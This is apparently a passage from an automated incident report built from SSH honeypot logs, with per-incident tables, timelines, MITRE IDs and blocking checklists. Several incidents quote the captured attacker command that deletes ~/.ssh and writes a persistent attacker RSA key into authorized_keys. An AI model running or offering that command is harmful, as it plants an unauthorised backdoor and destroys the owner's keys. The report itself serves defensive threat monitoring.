| `2026-04-21 05:23:30` | `cowrie.client.version` |
| `2026-04-21 05:23:30` | `cowrie.client.kex` |
| `2026-04-21 05:23:31` | `cowrie.login.success` |
| `2026-04-21 05:23:31` | `cowrie.session.params` |
| `2026-04-21 05:23:31` | `cowrie.command.input` |
| `2026-04-21 05:23:31` | `cowrie.command.failed` |
| `2026-04-21 05:23:31` | `cowrie.log.closed` |
| `2026-04-21 05:23:32` | `cowrie.session.params` |
| `2026-04-21 05:23:32` | `cowrie.command.input` |
| `2026-04-21 05:23:32` | `cowrie.session.file_download` |
| `2026-04-21 05:23:32` | `cowrie.log.closed` |
| `2026-04-21 05:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46e58661d9cf

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:23 |
| **Last Seen** | 2026-04-21 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:23:34` | `cowrie.session.connect` |
| `2026-04-21 05:23:34` | `cowrie.client.version` |
| `2026-04-21 05:23:34` | `cowrie.client.kex` |
| `2026-04-21 05:23:34` | `cowrie.login.success` |
| `2026-04-21 05:23:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bcec9842fde

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:23 |
| **Last Seen** | 2026-04-21 05:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:23:46` | `cowrie.session.connect` |
| `2026-04-21 05:23:46` | `cowrie.client.version` |
| `2026-04-21 05:23:46` | `cowrie.client.kex` |
| `2026-04-21 05:23:47` | `cowrie.login.success` |
| `2026-04-21 05:23:47` | `cowrie.session.params` |
| `2026-04-21 05:23:47` | `cowrie.command.input` |
| `2026-04-21 05:23:47` | `cowrie.command.failed` |
| `2026-04-21 05:23:47` | `cowrie.log.closed` |
| `2026-04-21 05:23:48` | `cowrie.session.params` |
| `2026-04-21 05:23:48` | `cowrie.command.input` |
| `2026-04-21 05:23:48` | `cowrie.session.file_download` |
| `2026-04-21 05:23:48` | `cowrie.log.closed` |
| `2026-04-21 05:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec18f3c84e1d

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:23 |
| **Last Seen** | 2026-04-21 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:23:50` | `cowrie.session.connect` |
| `2026-04-21 05:23:50` | `cowrie.client.version` |
| `2026-04-21 05:23:50` | `cowrie.client.kex` |
| `2026-04-21 05:23:50` | `cowrie.login.success` |
| `2026-04-21 05:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eafe1609d3f

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:24 |
| **Last Seen** | 2026-04-21 05:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:24:12` | `cowrie.session.connect` |
| `2026-04-21 05:24:12` | `cowrie.client.version` |
| `2026-04-21 05:24:12` | `cowrie.client.kex` |
| `2026-04-21 05:24:13` | `cowrie.login.success` |
| `2026-04-21 05:24:13` | `cowrie.session.params` |
| `2026-04-21 05:24:13` | `cowrie.command.input` |
| `2026-04-21 05:24:13` | `cowrie.command.failed` |
| `2026-04-21 05:24:14` | `cowrie.log.closed` |
| `2026-04-21 05:24:14` | `cowrie.session.params` |
| `2026-04-21 05:24:14` | `cowrie.command.input` |
| `2026-04-21 05:24:14` | `cowrie.session.file_download` |
| `2026-04-21 05:24:14` | `cowrie.log.closed` |
| `2026-04-21 05:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55373c79d8eb

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]132` |
| **First Seen** | 2026-04-21 05:24 |
| **Last Seen** | 2026-04-21 05:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:24:17` | `cowrie.session.connect` |
| `2026-04-21 05:24:17` | `cowrie.client.version` |
| `2026-04-21 05:24:17` | `cowrie.client.kex` |
| `2026-04-21 05:24:18` | `cowrie.login.success` |
| `2026-04-21 05:24:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]132` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73812a2d89d4

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:25 |
| **Last Seen** | 2026-04-21 05:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:25:37` | `cowrie.session.connect` |
| `2026-04-21 05:25:37` | `cowrie.client.version` |
| `2026-04-21 05:25:37` | `cowrie.client.kex` |
| `2026-04-21 05:25:38` | `cowrie.login.success` |
| `2026-04-21 05:25:38` | `cowrie.session.params` |
| `2026-04-21 05:25:38` | `cowrie.command.input` |
| `2026-04-21 05:25:38` | `cowrie.command.failed` |
| `2026-04-21 05:25:38` | `cowrie.log.closed` |
| `2026-04-21 05:25:39` | `cowrie.session.params` |
| `2026-04-21 05:25:39` | `cowrie.command.input` |
| `2026-04-21 05:25:39` | `cowrie.session.file_download` |
| `2026-04-21 05:25:39` | `cowrie.log.closed` |
| `2026-04-21 05:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a304fe97a111

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:25 |
| **Last Seen** | 2026-04-21 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:25:41` | `cowrie.session.connect` |
| `2026-04-21 05:25:41` | `cowrie.client.version` |
| `2026-04-21 05:25:41` | `cowrie.client.kex` |
| `2026-04-21 05:25:41` | `cowrie.login.success` |
| `2026-04-21 05:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68cbe37e041e

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:27 |
| **Last Seen** | 2026-04-21 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:27:33` | `cowrie.session.connect` |
| `2026-04-21 05:27:33` | `cowrie.client.version` |
| `2026-04-21 05:27:33` | `cowrie.client.kex` |
| `2026-04-21 05:27:34` | `cowrie.login.success` |
| `2026-04-21 05:27:34` | `cowrie.session.params` |
| `2026-04-21 05:27:34` | `cowrie.command.input` |
| `2026-04-21 05:27:34` | `cowrie.command.failed` |
| `2026-04-21 05:27:34` | `cowrie.log.closed` |
| `2026-04-21 05:27:35` | `cowrie.session.params` |
| `2026-04-21 05:27:35` | `cowrie.command.input` |
| `2026-04-21 05:27:35` | `cowrie.session.file_download` |
| `2026-04-21 05:27:35` | `cowrie.log.closed` |
| `2026-04-21 05:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cfd53b46a80

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:27 |
| **Last Seen** | 2026-04-21 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:27:37` | `cowrie.session.connect` |
| `2026-04-21 05:27:37` | `cowrie.client.version` |
| `2026-04-21 05:27:37` | `cowrie.client.kex` |
| `2026-04-21 05:27:37` | `cowrie.login.success` |
| `2026-04-21 05:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef7bbd7aea4

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:28 |
| **Last Seen** | 2026-04-21 05:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:28:04` | `cowrie.session.connect` |
| `2026-04-21 05:28:04` | `cowrie.client.version` |
| `2026-04-21 05:28:04` | `cowrie.client.kex` |
| `2026-04-21 05:28:05` | `cowrie.login.success` |
| `2026-04-21 05:28:05` | `cowrie.session.params` |
| `2026-04-21 05:28:05` | `cowrie.command.input` |
| `2026-04-21 05:28:05` | `cowrie.command.failed` |
| `2026-04-21 05:28:05` | `cowrie.log.closed` |
| `2026-04-21 05:28:06` | `cowrie.session.params` |
| `2026-04-21 05:28:06` | `cowrie.command.input` |
| `2026-04-21 05:28:06` | `cowrie.session.file_download` |
| `2026-04-21 05:28:06` | `cowrie.log.closed` |
| `2026-04-21 05:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbf5cabeaa2d

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:28 |
| **Last Seen** | 2026-04-21 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:28:08` | `cowrie.session.connect` |
| `2026-04-21 05:28:08` | `cowrie.client.version` |
| `2026-04-21 05:28:08` | `cowrie.client.kex` |
| `2026-04-21 05:28:09` | `cowrie.login.success` |
| `2026-04-21 05:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3b83a47b98

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:28 |
| **Last Seen** | 2026-04-21 05:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:28:44` | `cowrie.session.connect` |
| `2026-04-21 05:28:44` | `cowrie.client.version` |
| `2026-04-21 05:28:44` | `cowrie.client.kex` |
| `2026-04-21 05:28:44` | `cowrie.login.success` |
| `2026-04-21 05:28:45` | `cowrie.session.params` |
| `2026-04-21 05:28:45` | `cowrie.command.input` |
| `2026-04-21 05:28:45` | `cowrie.command.failed` |
| `2026-04-21 05:28:45` | `cowrie.log.closed` |
| `2026-04-21 05:28:45` | `cowrie.session.params` |
| `2026-04-21 05:28:45` | `cowrie.command.input` |
| `2026-04-21 05:28:45` | `cowrie.session.file_download` |
| `2026-04-21 05:28:45` | `cowrie.log.closed` |
| `2026-04-21 05:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55ab6dbf45f4

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:28 |
| **Last Seen** | 2026-04-21 05:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:28:47` | `cowrie.session.connect` |
| `2026-04-21 05:28:47` | `cowrie.client.version` |
| `2026-04-21 05:28:47` | `cowrie.client.kex` |
| `2026-04-21 05:28:48` | `cowrie.login.success` |
| `2026-04-21 05:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7db4beda95

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:29 |
| **Last Seen** | 2026-04-21 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:29:30` | `cowrie.session.connect` |
| `2026-04-21 05:29:30` | `cowrie.client.version` |
| `2026-04-21 05:29:30` | `cowrie.client.kex` |
| `2026-04-21 05:29:30` | `cowrie.login.success` |
| `2026-04-21 05:29:30` | `cowrie.session.params` |
| `2026-04-21 05:29:30` | `cowrie.command.input` |
| `2026-04-21 05:29:30` | `cowrie.command.failed` |
| `2026-04-21 05:29:31` | `cowrie.log.closed` |
| `2026-04-21 05:29:31` | `cowrie.session.params` |
| `2026-04-21 05:29:31` | `cowrie.command.input` |
| `2026-04-21 05:29:31` | `cowrie.session.file_download` |
| `2026-04-21 05:29:31` | `cowrie.log.closed` |
| `2026-04-21 05:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8557f0a9a06e

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:29 |
| **Last Seen** | 2026-04-21 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:29:33` | `cowrie.session.connect` |
| `2026-04-21 05:29:33` | `cowrie.client.version` |
| `2026-04-21 05:29:33` | `cowrie.client.kex` |
| `2026-04-21 05:29:34` | `cowrie.login.success` |
| `2026-04-21 05:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ffd221fb4a5

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:29 |
| **Last Seen** | 2026-04-21 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:29:47` | `cowrie.session.connect` |
| `2026-04-21 05:29:47` | `cowrie.client.version` |
| `2026-04-21 05:29:47` | `cowrie.client.kex` |
| `2026-04-21 05:29:48` | `cowrie.login.success` |
| `2026-04-21 05:29:48` | `cowrie.session.params` |
| `2026-04-21 05:29:48` | `cowrie.command.input` |
| `2026-04-21 05:29:48` | `cowrie.command.failed` |
| `2026-04-21 05:29:48` | `cowrie.log.closed` |
| `2026-04-21 05:29:49` | `cowrie.session.params` |
| `2026-04-21 05:29:49` | `cowrie.command.input` |
| `2026-04-21 05:29:49` | `cowrie.session.file_download` |
| `2026-04-21 05:29:49` | `cowrie.log.closed` |
| `2026-04-21 05:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a227a7511fe

| Field | Detail |
|---|---|
| **Source IP** | `103.194.239[.]180` |
| **First Seen** | 2026-04-21 05:29 |
| **Last Seen** | 2026-04-21 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:29:51` | `cowrie.session.connect` |
| `2026-04-21 05:29:51` | `cowrie.client.version` |
| `2026-04-21 05:29:51` | `cowrie.client.kex` |
| `2026-04-21 05:29:52` | `cowrie.login.success` |
